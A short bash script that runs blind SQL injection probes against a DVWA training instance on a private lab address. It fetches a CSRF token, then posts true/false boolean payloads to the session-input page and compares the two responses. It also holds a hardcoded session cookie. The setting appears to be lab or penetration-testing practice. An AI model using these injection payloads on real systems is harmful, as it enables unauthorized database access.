CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=high'
BASE='http://10.31.0.87:3000'
# canonical DVWA high blind flow: POST to session-input with user_token
TOK=$(curl -s -b "$CK" "$BASE/vulnerabilities/sqli_blind/" | grep -oE "user_token' value='[0-9a-f]{32}" | grep -oE '[0-9a-f]{32}')
echo "TOK=$TOK"
SI=session-input.php
for p in "1' AND 1=1 -- x" "1' AND 1=2 -- x"; do
  curl -s -b "$CK" "$BASE/vulnerabilities/sqli_blind/$SI" \
    --data-urlencode "id=$p" \
    --data-urlencode "Submit=Submit" \
    --data-urlencode "user_token=$TOK" -o /dev/null
  RES=$(curl -s -b "$CK" "$BASE/vulnerabilities/sqli_blind/" | grep -oE '<pre>.*</pre>' | sed 's/<[^>]*>//g')
  echo "$RES <<== [$p]"
done
